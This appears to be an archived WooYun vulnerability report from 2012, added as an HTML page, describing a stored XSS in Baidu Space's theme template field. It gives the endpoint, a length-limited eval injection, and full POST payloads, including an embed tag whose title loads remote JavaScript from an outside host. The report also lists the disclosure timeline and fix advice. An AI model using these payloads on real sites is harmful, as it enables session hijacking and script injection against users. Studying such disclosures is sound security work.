@@ -1,0 +1,256 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		新版百度空间存储型XSS  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		新版百度空间存储型XSS  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-05-27 15:03</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-05-27：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-05-30：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-06-09：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-06-19：	细节向普通白帽子公开<br/>
+									2012-06-29：	细节向实习白帽子公开<br/>
+									2012-07-11：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">新版的百度空间有一处没有过滤导致XSS，但是可以被利用的字段，长度限制为了20个长度，去掉两端的构造字符，只有16个长度了。还是老办法，eval(X), eval(name)的方法在利用上比较间接，不做第一考虑，我们还是优先想办法找一处可以注入ID=&quot;X&quot;的位置，然后。。。 </p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 漏洞出现在新版百度空间模板的选择上。<br />
+<br />
+2. 缺陷地址：http://hi.baidu.com/set/submit/theme<br />
+<br />
+3. 缺陷参数: template<br />
+<br />
+4. 缺陷原因: 除了限制了20个长度，未做任何输入输出过滤。<br />
+<br />
+5. theme在注入自定义内容后，将在空间主页以及各文章页面内以下代码处出现。<br />
+<br />
+</p><pre><code>window.CurrentApplyedTpl = &#039;{template内容}&#039;;</code></pre><p class='detail'><br />
+<br />
+6. 基于此，我们可以构造恶意代码如下：<br />
+<br />
+</p><pre><code>window.CurrentApplyedTpl = &#039;&#039;;eval(XXX)//&#039;;   //XXX表示可以被控制的变量</code></pre><p class='detail'><br />
+<br />
+7.  XXX 可选对象<br />
+<br />
+	&#039;;eval(qUserInfo.spaceName)//    &lt;--29个长度，不可取<br />
+<br />
+	&#039;;eval(M.innerHTML)//  &lt;-- 21个长度，也不行<br />
+<br />
+	&#039;;eval(M.title)//      &lt;--17个长度<br />
+<br />
+	&#039;;eval(M.name)//      &lt;--16个长度<br />
+<br />
+	&#039;;eval(M.alt)//      &lt;--15个长度<br />
+<br />
+	&#039;;eval(M.src)//      &lt;--15个长度<br />
+<br />
+8. 基于以上考虑，我们就得找一个位置，可以写入 id=&quot;M&quot; 属性名=&quot;被eval的代码&quot;。<br />
+<br />
+	但是经过测试，百度空间发表文章里的 &lt;img&gt; 标签无法写入 id属性。<br />
+<br />
+9. 但是运气比较好的是，偶然随手测试发现&lt;embed&gt;&lt;/embed&gt;标签竟然可以直接使用（难道是旧版空间的残留？）<br />
+<br />
+	运气更不错的是，&lt;embed&gt;&lt;/embed&gt; 还可以写入 title 属性。(其它的 alt,name 无法写入，src需要以http://开头)<br />
+<br />
+10. 因而，我们可以构造出以下利用步骤。<br />
+<br />
+<br />
+<br />
+利用步骤：<br />
+<br />
+<br />
+<br />
+A. POST http://hi.baidu.com/set/submit/theme<br />
+<br />
+   POSTDATA<br />
+<br />
+   template=&#039;;eval(M.title)//&amp;bdstoken={my token}&amp;qing_request_source=<br />
+<br />
+<br />
+<br />
+B. 随便发表一篇文章。 POST的content内容修改为以下：<br />
+<br />
+   POST http://hi.baidu.com/pub/submit/modifytext<br />
+<br />
+   POSTDATA (content以外的参数省略)<br />
+<br />
+   content=encodeURIComponent(&lt;div&gt;&lt;p&gt;&lt;embed src=&quot;http://www.toolmao.com&quot; id=&quot;M&quot; title=&quot;(function(){var s=document.createElement(&#039;script&#039;);s.src=&#039;http://xsst.sinaapp.com/m.js&#039;;document.body.appendChild(s)})()&quot;&lt;/p&gt;&lt;/div&gt;)<br />
+<br />
+<br />
+<br />
+C. 那么此文章就成了一个可以用来跨站的页面了。<br />
+<br />
+<br />
+<br />
+效果见漏洞证明！<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">测试平台: Win7 + Chrome, IE<br />
+<br />
+<br />
+<br />
+Chrome下的效果<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/2714435301ef0766a594f6df9d4b9535409bf273.jpg" target="_blank"><img src="../images/2714435301ef0766a594f6df9d4b9535409bf273.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+IE 下的效果<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/2714443228022bf706368a55bf1bac9e653c4d85.jpg" target="_blank"><img src="../images/2714443228022bf706368a55bf1bac9e653c4d85.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1. http://hi.baidu.com/set/submit/theme 过滤template的内容<br />
+<br />
+2. http://hi.baidu.com/pub/submit/modifytext 新版空间还用的到embed标签不？就算用的到，也可以和img一样，把id给过滤掉。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-07571" title="新版百度空间存储型XSS">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2012-05-30 17:18</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢提交，正在修复中</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="7571";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
